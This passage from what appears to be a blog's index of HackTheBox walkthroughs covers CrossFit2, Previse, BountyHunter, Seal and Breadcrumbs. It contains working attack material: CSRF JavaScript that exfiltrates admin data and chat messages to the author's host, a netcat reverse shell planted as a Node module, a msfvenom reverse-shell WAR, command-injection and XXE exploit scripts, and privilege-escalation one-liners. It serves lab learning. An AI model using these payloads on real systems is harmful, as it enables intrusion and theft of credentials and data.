headerAnd with csrf token, get “Only administrators can register accounts.” message.CSRFAccount RegistrationWe already make admin to connect to our http server from dns hijacking. Here we can use cross site request forgery to execute javascript from admin browser which register new account on behalf of admin.Create a javascript that execute from victim’s browser and register account. from ippsec video&amp;lt;html&amp;gt;&amp;lt;script&amp;gt;// retrive csrf token from admin login session.var req1 = new XMLHttpRequest();req1.open(&quot;GET&quot;, &quot;http://crossfit-club.htb/api/auth&quot;, false);req1.withCredentials = true;req1.send();var obj = JSON.parse(req1.response);// register new account from admin browser.var req2 = new XMLHttpRequest();req2.open(&quot;POST&quot;, &quot;http://crossfit-club.htb/api/signup&quot;, false);req2.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;);req2.setRequestHeader(&quot;X-CSRF-TOKEN&quot;, obj.token);req2.withCredentials = true;const data = JSON.stringify( {&quot;username&quot;: &quot;poorduck&quot;, &quot;email&quot;: &quot;poorduck@duckland.duck&quot;, &quot;password&quot;: &quot;p00rduck&quot;, &quot;confirm&quot;: &quot;p00rduck&quot;} );req2.send(data);// send signup response to attacker&#39;s server.var req3 = new XMLHttpRequest();req3.open(&quot;GET&quot;, &quot;http://10.10.15.71/?&quot; + btoa(req2.response));req3.send();&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;Save as password-reset.php in the www directory.And execute same DNS Rebinding attack. If everything goes well we’ll get a extra request that contains signup response.unbound-control -c unbound.conf -s 10.10.10.232 forward_add +i ex-exployees.crossfit.htb 10.10.15.71sudo php -S 0.0.0.0:80After some time get requests from victim but don’t get any response of signup.When debug php file in local browser, found “Cross-Origin Request Blocked”CORS Bypass using host headerfrom PayloadsAllTheThings, There is a server misconfiguration scenario where the dot was not escaped correctly. something like this: ^api.example.com$ instead of ^api\\.example.com$. Thus, the dot can be replaced with any letter to gain access from a third-party domain.And here this technique work for both subdomains employees.crossfit.htb and gym.crossfit.htb❯ curl -s -q -v -H &#39;Origin: http://employeesXcrossfit.htb&#39; http://crossfit-club.htb/api/auth 2&amp;gt;&amp;amp;1 | grep &quot;Origin&quot;&amp;gt; Origin: http://employeesXcrossfit.htb&amp;lt; Access-Control-Allow-Origin: http://employeesXcrossfit.htbNow the another thing we can do with that misconfigured domain *employees.crossfit.htb in relayd config. That wildcard can be anything. if we add something like anything.htb/anything-employees.crossfit.htb it still resolves employees.crossfit.htb❯ curl -s -X &#39;POST&#39; -H &#39;Host: anything.htb/anything-employees.crossfit.htb&#39; --data-binary &#39;email=david.palmer%40crossfit.htb&#39; &#39;http://10.10.10.232/password-reset.php&#39; | grep alert | sed &#39;s/.*role=&quot;alert&quot;&amp;gt;\\(.*\\)&amp;lt;button.*/\\1/&#39;Only local hosts are allowed.but host value stored as anything.htb/anything-employees.crossfit.htb and browser translate host as anything.htb and strip anything after first domain and this time, When victim click on reset link it will redirect to anything.htb.Doing same DNS Hijacking attack but this time we change host domain to employeesXcrossfit.htb/employees.crossfit.htb.This time we add employeesXcrossfit.htb domain in unboun-control, because when user click on link with employeesXcrossfit.htb/employees.crossfit.htb host his browser everything after first domain and make request to employeesXcrossfit.htb.unbound-control -c unbound.conf -s 10.10.10.232 forward_add +i employeesXcrossfit.htb 10.10.15.71And change fakedns config ruleA employeesXcrossfit.htb 127.0.0.1 2%10.10.15.71python script to automate thisfrom re import findallfrom time import sleepfrom subprocess import Popen, PIPE, STDOUTfrom os import systemimport requests as rwebsocket = &quot;ws://gym.crossfit.htb/ws/&quot;url = &quot;http://employees.crossfit.htb/password-reset.php&quot;def req_token(): data = {&quot;email&quot;: &quot;david.palmer@crossfit.htb&quot;} headers = {&quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;employeesXcrossfit.htb/employees.crossfit.htb&quot;} rspn = r.post(url, data=data, headers=headers) alert = findall(r&#39;role=&quot;alert&quot;&amp;gt;(.*?)&amp;lt;button&#39;, rspn.text)[0] return alertfakedns = &quot;/home/x00tex/git-tools/FakeDns/fakedns.py&quot;conf = &quot;fakedns.conf&quot;# system(&#39;unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i ex-employees.crossfit.htb 10.10.15.71&#39;)system(&#39;unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i employeesXcrossfit.htb 10.10.15.71&#39;)out = Popen([&#39;python&#39;, f&#39;{fakedns}&#39;, &#39;-c&#39;, f&#39;{conf}&#39;], stdout=PIPE, stderr=STDOUT)sleep(5)rspn = req_token()print(rspn)if &quot;Reset link sent&quot; in rspn: system(&quot;sudo php -S 0.0.0.0:80&quot;)else: out.kill() exit()Socket.io listener hookingAfter login to crossfit-club.htb found only functional page chatChat function is using socket.io javascript api library.socket.io: Socket.IO is a JavaScript library for realtime web applications. It enables realtime, bi-directional communication between web clients and servers. It has two parts: a client-side library that runs in the browser, and a server-side library for Node.js. Both components have a nearly identical API.server and client’s Socket object act as EventEmitters, you can emit with socket.emit() and listen with socket.on() for events in a bi-directional manner.How client side socket.io script is working is, It generate 3 requests. First it set a GET event listener then second send a ping/message in POST emit request and receive server response in first GET event listener and Third start new GET event listener.There are 2 types of chat, Global chat and Private chat.From http://crossfit-club.htb/js/app~748942c6.ead68abe.js we can see all listener.If we send message to any user, we can see his reply in first GET listener response. but it is not showing in chat window.If we hook private_recv listener of admin account to our server, we can read admin messages.Using the same CSRF account registration technique to trick admin to execute a javascript that executes from admin browser and hook private_recv to our http server and intercept all traffic that come through private_recv listener.from ippsec video&amp;lt;html&amp;gt;&amp;lt;script src=&quot;http://crossfit-club.htb/socket.io/socket.io.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;var socket = io.connect(&#39;http://crossfit-club.htb&#39;);socket.emit(&quot;user_join&quot;, { username : &quot;admin&quot; });socket.on(&quot;private_recv&quot;, function(msg) { var req = new XMLHttpRequest(); req.open(&quot;GET&quot;, &quot;http://10.10.15.71/?&quot; + btoa(JSON.stringify(msg))); req.send();});&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;after some time, receive message with user “David” ssh passwordPrivescUser “david” is in “sysadmins” group.Searching for files where “sysadmins” group users have read/write access.crossfit2$ find / -group sysadmins -ls 2&amp;gt;/dev/null1244170 4 drwxrwxr-x 3 root sysadmins 512 Feb 3 2021 /opt/sysadminFind a javascript file inside /opt/sysadmin/server/statbot-rw-r--r-- 1 root wheel 740 Jan 13 2021 statbot.js` script is executing every minute and loging data in /tmp/chatbot.logNode module hijackscript using 2 nodejs modulesconst WebSocket = require(&#39;ws&#39;);const fs = require(&#39;fs&#39;);but there is no node_module directory in current folder. Whenever we create a new project and install required modules with nmp they installed in node_modules directory inside project folder. if not than used from nmp global library. you can understand nodejs folder Structures from docs.npmjs.com websocket module install in node_modules/ws directory and load from node_modules/ws/index.js.Get nodejs reverse shell from PayloadsAllTheThingsuser “david” have write access in /opt/sysadmin directory.Create recursive directry node_modules/ws/ and inside this folder create index.js file with reverse shell.mkdir -p /opt/sysadmin/node_modules/ws/cat &amp;lt;&amp;lt; EOF &amp;gt; /opt/sysadmin/node_modules/ws/index.jsrequire(&#39;child_process&#39;).exec(&#39;rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.15.71 4141 &amp;gt;/tmp/f&#39;)EOFGot shell as user “john”User “david” is in “staff” group.Searching for files where “staff” group users have read/write access.crossfit2$ find / -group staff -ls 2&amp;gt;/dev/null1481580 20 -rwsr-s--- 1 root staff 9024 Jan 5 2021 /usr/local/bin/logFind a suid binary inside owned by “staff” group.This binary can read log files.crossfit2$ /usr/local/bin/log* LogReader v0.1[*] Usage: /usr/local/bin/log &amp;lt;log file to read&amp;gt;Binary is reading every file inside /var directory, but we can not read any file out side /var directory.crossfit2$ /usr/local/bin/log /var/unbound/etc/unbound.conf* LogReader v0.1[*] Log size: 777server: interface: 127.0.0.1 interface: ::1#... [snip] ...Because bianry is using unvail function to set /var direcotryWhen searching for openbsd /var/backup first result is changelistForm changelist description: “The /etc/changelist file is a simple text file containing the names of files to be backed up and checked for modification by the system security script. It is checked daily by the /etc/daily script. Each line of the file contains the name of a file, specified by its absolute pathname, one per line. By default, configuration files in /etc, /root, and /var are added during system install. Backup files are held in the directory /var/backups”. /etc/changelist file contains root ssh key /root/.ssh/id_rsa in the list.And from same /etc/changelist man page, how files stored in the /var/backups direcotry: “For example, the system shell database, /etc/shells, is held as /var/backups/etc_shells.current. When this file is modified, it is renamed to /var/backups/etc_shells.backup and the new version becomes /var/backups/etc_shells.current. Thereafter, these files are rotated”. /root/.ssh/id_rsa conatins + that means it is modified. That means file stored in /var/backups as root_.ssh_id_rsa.current. We can read it with /usr/local/bin/log from /var/backups/root_.ssh_id_rsa.currentyubikeyTry to login with root ssh key, it’s asking for passsowrd. checking ssh debug logs, ssh login use 2 Authentication method publickey and password.from etc/ssh/sshd_configMatch User root AuthenticationMethods publickey,passwordAnd /etc/login.confdaemon:\\#... [snip] ... :auth-ssh=yubikey:\\ssh Authentication required passowrd for root and that password is a yubikey.YubiKey is a hardware authentication device manufactured by Yubico.First time Configuration generate 2 files username.uid and username.keyfrom login_yubikey man page: “login_yubikey will read the user’s UID (12 hex digits) from the file user.uid, the user’s key (32 hex digits) from user.key, and the user’s last-use counter from user.ctr in the /var/db/yubikey directory.So when we login to ssh and enter password, login_yubikey increment user’s login counter and verify entered passowrd based on above parameters.We can read these file with /usr/local/bin/log bianry./usr/local/bin/log /var/db/yubikey/root.uid/usr/local/bin/log /var/db/yubikey/root.key/usr/local/bin/log /var/db/yubikey/root.ctrThere are multiple scripts all tool to generate yubikey OTP. yubisim: writen in java require java8, which can be enable (if installed) with sudo update-alternatives --config java and sudo update-alternatives --config javac require “Public ID” which is yubikey device ID yubico-c: written in c require asciidoc and compile from source. yubico-c technique from 0xdf’s walkthrough python script form xct’s videoDon’t understand it completely but got the root flag with xct’s python script." }, { "title": "Hackthebox - Previse", "url": "/posts/previse/", "categories": "hackthebox, linux", "tags": "command injection, binary path injection", "date": "2021-08-09 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.104 previse.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Previse Login|_Requested resource was login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFound bunch of php file from gobuster scan/logout.php (Status: 302) [Size: 0] [--&amp;gt; login.php] /login.php (Status: 200) [Size: 2224] /download.php (Status: 302) [Size: 0] [--&amp;gt; login.php] /files.php (Status: 302) [Size: 4914] [--&amp;gt; login.php] /logs.php (Status: 302) [Size: 0] [--&amp;gt; login.php] /config.php (Status: 200) [Size: 0] /index.php (Status: 302) [Size: 2801] [--&amp;gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--&amp;gt; login.php] /nav.php (Status: 200) [Size: 1248] /status.php (Status: 302) [Size: 2968] [--&amp;gt; login.php]bunch of php files and most of them are redirecting to login.php but all redirect sizes are different. If we intercept these redirect requests we can see these file content. New Thing:** This is a EAR(Execution After Redirect) vulnerability **(owasp docs)[https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)]And there’s also a zip file.We can create new account from /accounts.php with POST request.And now we can download that siteBackup.zip.Zip file contains source code of the web application.FootholdBlind Command Injection From config.php got mysql creds root:mySQL_p@ssw0rd!:). logs.php has a command injection bug in line 19-20 User input from /logs.php POST request parameter delim directly placced in the exec(). /logs.php file executing python script and takes input from delim parameter, and it is vulnerable form blind command injection.Exploit Scriptimport sysimport requests as rurl = &#39;http://10.10.11.104&#39;try: def signup(): location = f&#39;{url}/accounts.php&#39; data = {&#39;username&#39;: &#39;poorduck&#39;, &#39;password&#39;: &#39;p00rduck&#39;, &#39;confirm&#39;: &#39;p00rduck&#39;} create_ac = r.post(location, data=data, allow_redirects=False) if &#39;Success! User was added!&#39; in create_ac.text: return &#39;[+] Account is created&#39; elif &#39;Username is already taken!&#39; in create_ac.text: return &#39;[+] User already exits&#39; else: return create_ac.text print(signup()) s = r.session() data = {&#39;username&#39;: &#39;poorduck&#39;, &#39;password&#39;: &#39;p00rduck&#39;} s.post(f&#39;{url}/login.php&#39;, data=data) def exec_cmd(cmd): location = f&#39;{url}/logs.php&#39; data = {&#39;delim&#39;: f&#39;`{cmd}`&#39;} execute = s.post(location, data=data, timeout=10) if &#39;time,user,fileID&#39; in execute.text: return &#39;[+] Command Executed. This is a blind command injection!&#39; else: return execute.text print(exec_cmd(sys.argv[1])) s.close()except r.exceptions.Timeout: print(&#39;\\n[-] Response timeout!&#39;)except KeyboardInterrupt: print(&#39;\\n[-] Exiting execution!&#39;)PrivescAbsolute Path InjectionLogged in to sql server with found creds and got user m4lwhere password hash, cracked with john and su to user m4lwhere with that password.User m4lwhere can run a python script with sudo as root.m4lwhere@previse:~$ sudo -l[sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.shScript is using date and gzip command without specifying full path and there is no secure path set in sudo.Using path injection to exploit that scriptecho &#39;chmod +s /bin/bash&#39; &amp;gt; /tmp/date &amp;amp;&amp;amp; chmod +x /tmp/dateexport PATH=/tmp:$PATHsudo -u root /opt/scripts/access_backup.sh" }, { "title": "Hackthebox - BountyHunter", "url": "/posts/bountyHunter/", "categories": "hackthebox, linux", "tags": "xxe, programming logic", "date": "2021-07-26 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.100 bountyHunter.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFrom web server on port 80, /portal.php lead to /log_submit.phpThis page takes users input and send it in xml form as base64 encoded strings.From gobuster found a interesting file.gobuster dir -u &quot;http://10.10.11.100&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt/db.php (Status: 200) [Size: 0]FootholdxxeTesting xxe and get /etc/passwd file from xxe payload.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY&amp;gt; &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;test&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;test&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;test&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;Simple python script to automate xxeimport reimport sysimport requests as rimport base64url = &quot;http://10.10.11.100/tracker_diRbPr00f314.php&quot;payload = &quot;php://filter/convert.base64-encode/resource=db.php&quot;# payload = &quot;file:///etc/passwd&quot;# payload = sys.argv[1]data = f&quot;&quot;&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY&amp;gt; &amp;lt;!ENTITY xxe SYSTEM &quot;{payload}&quot;&amp;gt;]&amp;gt; &amp;lt;bugreport&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;cwe&amp;gt;test&amp;lt;/cwe&amp;gt; &amp;lt;cvss&amp;gt;test&amp;lt;/cvss&amp;gt; &amp;lt;reward&amp;gt;test&amp;lt;/reward&amp;gt; &amp;lt;/bugreport&amp;gt;&quot;&quot;&quot;.encode(&#39;ascii&#39;)postdata = {&quot;data&quot;: base64.b64encode(data).decode(&#39;ascii&#39;)}rspn = r.post(url, data=postdata)# print(rspn.text)filter_rspn = re.findall(&#39;&amp;lt;td&amp;gt;(.*?)&amp;lt;/td&amp;gt;&#39;, rspn.text, re.DOTALL)[1]try: b64decode = base64.b64decode(filter_rspn).decode() print(bytes(b64decode, &#39;utf-8&#39;).decode(&#39;unicode_escape&#39;))except Exception: print(filter_rspn) Get username from /etc/passwd: “development” And db creds from: db.php: “m19RoAU0hP41A1sTsq6K”database password worked for user “development” ssh login.Privescprogramming logicUser “development” can run a python script /opt/skytrain_inc/ticketValidator.py with sudodevelopment@bountyhunter:~$ sudo -lMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyThis script doing somethingbecause script is not sanitizing input and directly send it to eval with some conditions, we only need to pass some checks and get code execution.# Skytrain Inc## Ticket to hell__Ticket Code:__**11 + 90 == 101 and __import__(&#39;os&#39;).system(&#39;/bin/bash&#39;)" }, { "title": "Hackthebox - Seal", "url": "/posts/seal/", "categories": "hackthebox, linux", "tags": "tomcat, url parser logic, sudo ansible-playbook", "date": "2021-07-18 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.250 seal.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)| 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)|_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after: 2022-05-05T10:24:03| tls-alpn: |_ http/1.1| tls-nextprotoneg: |_ http/1.18080/tcp open http-proxy| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized| Date: Mon, 19 Jul 2021 01:58:12 GMT| Set-Cookie: JSESSIONID=node011404vs9ar3yf13p0bynzm3e473256.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| GetRequest: | HTTP/1.1 401 Unauthorized| Date: Mon, 19 Jul 2021 01:58:09 GMT| Set-Cookie: JSESSIONID=node0tb9dlbm6phenql9adikr4oaa73254.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| HTTPOptions: | HTTP/1.1 200 OK| Date: Mon, 19 Jul 2021 01:58:10 GMT| Set-Cookie: JSESSIONID=node0lj0ulchztdazm08pgm1ft1e173255.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Allow: GET,HEAD,POST,OPTIONS| Content-Length: 0... [snip] ...| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8). Host os is Ubuntu Focal from OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 Get Hostname: seal.htb from https server ssl certificate. Viewing ssl certificate found Email address: admin@seal.htbPort 8080 Running “GitBucket”Create new account and login, found some “root” user repositoriesInformation collected from gitbucket repositories Found 2 Users Infra Admin:alex@seal.htb and Core Dev:luis@seal.htb alex luis seal_market repository contains source code for application running on https server. From on of the seal_market repository commit found Tomcat credential: tomcat:42MrHBf*z8{Z% successfully logged in as user “luis” with tomcat password “42MrHBf*z8{Z%”. from nginx config /root/seal_market/blob/master/nginx/sites-enabled/default, nginx server worked as a proxy and redirect https server to local tomcat server /root/seal_market/blob/master/tomcat/server.xml. From /root/seal_market/blob/master/nginx/sites-enabled/default There are 3 locations on the server Tomcat manager: /manager/html and /host-manager/html seal_market app admin: /admin/dashboard These locations only accessible mutual authentication, There is no registration and login features for accessing. Mutual Authentication: The TLS handshake Certificate Request message is optionally sent by the server to the client. … After sending the Certificate Request message and receiving a reply, the server verifies the client’s certificate. When verification is successful, the server has authenticated the client. Footholdserver url Parser LogicThis configuration could bypass with ; because of the Path Normalization bypass flaw. Breaking Parser Logic! By Orange Tsai Tomcat specificWhen we send request to a simple nginx server /test1/../test2 it normalized to /test2 and if we add anything with .. like /..!/ it will not and if we send /..;/ reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is. Tomcat will threat the sequence /..;/ as /../ and normalize the path while.This can even bypass with /;/manager/htmlNow, upload malicious war file and get reverse shellGenerate war filemsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f war &amp;gt; reverse.warIntercept war file upload request in burp.edit the url and forward requestPrivescansible-playbook Command with sudoIn /opt directory, there is a run.yml that creating backup of /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory and using copy_links=yes parameter and if check ansible synchronize_module docscopy_links Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink.And Two things we already have read access in user “luis” home folder and write access in /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads.(remote) tomcat@seal:/home$ ls -l total 4drwxr-xr-x 9 luis luis 4096 May 7 07:01 luis(remote) tomcat@seal:/home$ ls -l /var/lib/tomcat9/webapps/ROOT/admin/dashboardtotal 92drwxr-xr-x 5 root root 4096 Mar 7 2015 bootstrapdrwxr-xr-x 2 root root 4096 Mar 7 2015 cssdrwxr-xr-x 4 root root 4096 Mar 7 2015 images-rw-r--r-- 1 root root 71744 May 6 10:42 index.htmldrwxr-xr-x 4 root root 4096 Mar 7 2015 scriptsdrwxrwxrwx 2 root root 4096 May 7 09:26 uploadsand user “luis” home folder contains .ssh directory.we can symlinks /home/luis/.ssh in /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads and when next backup created it will add .ssh directoryln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploadsUser “luis” can run /usr/bin/ansible-playbook as any user with sudo.luis@seal:~$ sudo -lMatching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *and /usr/bin/ansible-playbook this symlink to ansibleluis@seal:~$ ls -la /usr/bin/ansible-playbooklrwxrwxrwx 1 root root 7 Mar 16 2020 /usr/bin/ansible-playbook -&amp;gt; ansiblefound exploit in gtfobinsTF=$(mktemp)echo &#39;[{hosts: localhost, tasks: [shell: /bin/sh &amp;lt;/dev/tty &amp;gt;/dev/tty 2&amp;gt;/dev/tty]}]&#39; &amp;gt;$TFsudo /usr/bin/ansible-playbook $TF" }, { "title": "Hackthebox - Breadcrumbs", "url": "/posts/breadcrumbs/", "categories": "hackthebox, windows", "tags": "lfi, file-upload, stickynotes backups, sqli", "date": "2021-06-30 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.228 breadcrumbs.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1|_http-title: Library135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1|_http-title: Library| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds?3306/tcp open mysql?| fingerprint-strings: | FourOhFourRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPBindReq, NCP, NotesRPC, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TerminalServer, WMSRequest, X11Probe: |_ Host &#39;10.10.15.71&#39; is not allowed to connect to this MariaDB server5040/tcp open unknown7680/tcp open pando-pub?49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC SMB access denied without password ❯ cme smb 10.10.10.228 -u &#39;&#39; -p &#39;&#39;SMB 10.10.10.228 445 BREADCRUMBS [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False)SMB 10.10.10.228 445 BREADCRUMBS [-] Breadcrumbs\\: STATUS_ACCESS_DENIED Nothing found in ssl certificate. sql server not allowed remote host ❯ mysql -h 10.10.10.228ERROR 1130 (HY000): Host &#39;10.10.15.71&#39; is not allowed to connect to this MariaDB server WebAppwebapp have a search option which search book in the database.Intercept search request in the burpsuite and found extra parameter in the search request.Changing the method value to 1 give an interesting error.adding book post parameter and send the request and its value reflect in the file_get_contents directory path.FootholdLFITry to include server ../includes/bookController.php file to check lfi and Get bookController.php file.This script simply including file from filesystem if method set to 1 with parameter book and second thing is that this script including ../db/db.php... [snip] ... require &#39;../db/db.php&#39;;... [snip] ... elseif ($_POST[&#39;method&#39;] == 1){ $out = file_get_contents(&#39;../books/&#39; . $_POST[&#39;book&#39;]); }... [snip] ...Using lfi vuln read that db.php file amd get dbcreds, But remote host not allowed access to mysql server.... [snip] ...$user=&quot;bread&quot;;$password=&quot;jUli901&quot;;... [snip] ...Get the lfi but burp out of lfi look awful so i create a simple python script. Not perfect but can do the job.import requests as rimport sysurl = &#39;http://10.10.10.228/includes/bookController.php&#39;def lfi(file): data = { &quot;title&quot;: &quot;lfi&quot;, &quot;author&quot;: &quot;lfi&quot;, &quot;method&quot;: 1, &quot;book&quot;: file } rspn = r.post(url, data=data) cleaned = rspn.text.replace(&#39;\\\\r\\\\n&#39;, &#39;\\n&#39;).replace(&#39;\\\\&#39;, &#39;&#39;) return cleanedprint(lfi(sys.argv[1])[1:-1])PortalRunning Gobuster found /portal, which redirect to /portal/login.phpFrom that error on login page, found some usernamesIntercepting login request found same method parameter.replacing method value to 1 return error from \\portal\\authController.php. Viewing the source code of that file found that passwordConf parameter used in sighup.After reading authController.php, some things which i understand. There are two methods of login. $_POST[&#39;method&#39;] == 1 uses username and passowrd for signup. $_POST[&#39;method&#39;] == 0 use username and password for login and set php session cookie and jwt token. php session cookie generated manually from cookie.php file. What cookie.php doing is taking username Chose random number from the length of the username generate key with some text and that random number’s index character from username and join user name and md5sum of the key. Found jwt secret key and payload from authController.php jwt only use username to generate token. If we signup with new account we get php session cookie and jwt token. From user Dashboard, get bunch of locations, but there is only one location “File management” /portal/php/files.php which redirect to index.php.View that file source code with lfi, found that it is only accessible by user “paul”, who is the admin and this file have file upload option.files.php also contains a javascript /assets/js/files.js, which appending .zip to uploaded file and also including /includes/fileController.php/includes/fileController.php is checking if requested user is user “paul” or not by decoding requested session’s jwt token and session’s username. If it is equal to “paul” than upload file in /portal/uploads/ directory.File upload to RCEFirst, generate user “paul” php session id. Because of the length of the user “paul” there are 4 possible session ids and 1/16 chances of login as user “paul”.Second, Generate jwt token for user “paul”. This is always same because there only 1 static value in the payload.Here is php script to generate session ID and jwt token.&amp;lt;?php/*First run &quot;composer require firebase/php-jwt&quot;*/require **DIR** . &#39;/vendor/autoload.php&#39;;use Firebase\\JWT\\JWT;$username = &quot;paul&quot;;function makesession($username){ $max = strlen($username) - 1; $seed = rand(0, $max); $key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;; $session_cookie = $username.md5($key); return $session_cookie;}echo makesession($username) . &quot;\\n&quot;;$secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;;$payload = array( &quot;data&quot; =&amp;gt; array( &quot;username&quot; =&amp;gt; $username));$jwt = JWT::encode($payload, $secret_key, 